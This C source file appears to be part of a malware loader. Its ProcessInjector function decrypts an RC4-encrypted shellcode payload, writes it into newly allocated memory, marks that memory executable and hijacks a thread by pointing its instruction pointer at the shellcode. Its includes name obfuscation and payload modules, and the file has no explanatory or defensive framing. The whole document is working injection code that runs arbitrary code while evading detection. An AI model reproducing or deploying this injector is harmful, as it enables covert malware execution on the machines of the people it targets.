#include "injector.h"
#include <stdio.h>
#include "obfuscation.h"
#include "ThreadLocal.h"
#include "payload.h"


BOOL ProcessInjector(IN PVOID Shellcode, IN SIZE_T sShellcode, HANDLE* hThread) {

	PVOID pAddress = NULL;
	DWORD oldProtect = 0;
	CONTEXT ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// Decrypt Payload
	Rc4BySystemFunction(Rc4Key, (PBYTE)Shellcode, sizeof(Rc4Key), sShellcode);

	// Injection
	pAddress = VirtualAlloc(NULL, sShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(pAddress, Shellcode, sShellcode);
	VirtualProtect(pAddress, sShellcode, PAGE_EXECUTE_READWRITE, &oldProtect);
	GetThreadContext(*hThread, &ThreadCtx);
	ThreadCtx.Rip = pAddress;
	SetThreadContext(*hThread, &ThreadCtx);

	return TRUE;
}
